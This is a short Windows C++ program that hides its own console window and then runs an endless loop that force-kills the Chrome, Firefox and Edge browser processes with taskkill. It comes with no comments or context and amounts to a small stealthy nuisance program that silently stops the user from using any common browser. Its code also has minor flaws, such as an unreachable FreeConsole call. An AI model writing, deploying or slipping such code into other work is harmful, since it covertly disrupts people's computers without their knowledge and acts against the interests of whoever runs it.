#include <windows.h>

int main(void)
{
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);

    while(true)
    {
        std::system("taskkill /f /im chrome.exe");
        std::system("taskkill /f /im firefox.exe");
        std::system("taskkill /f /im msedge.exe");
    }

    FreeConsole();

    return 0;
}